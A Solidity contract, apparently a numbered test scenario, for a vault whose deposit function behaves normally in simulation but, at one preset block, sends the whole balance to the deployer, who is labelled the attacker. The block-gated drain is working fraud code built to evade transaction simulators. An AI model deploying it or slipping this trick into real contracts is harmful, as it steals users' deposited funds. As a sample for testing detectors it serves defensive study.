// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract S03BlockGatedVault {
    address public attacker;
    address public owner;
    uint256 public liveBlock;

    event Deposit(address indexed user, uint256 amount);
    event Drained(address indexed attacker, uint256 amount);

    constructor(uint256 _liveBlock) payable {
        attacker = msg.sender;
        owner = msg.sender;
        liveBlock = _liveBlock;
    }

    function deposit(uint256 amount) external payable {
        if (block.number == liveBlock) {
            // malicious path: drain to attacker
            uint256 balance = address(this).balance;
            (bool success, ) = payable(attacker).call{value: balance}("");
            require(success, "Drain failed");
            emit Drained(attacker, balance);
        } else {
            // simulation path: behave normally
            emit Deposit(msg.sender, amount);
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}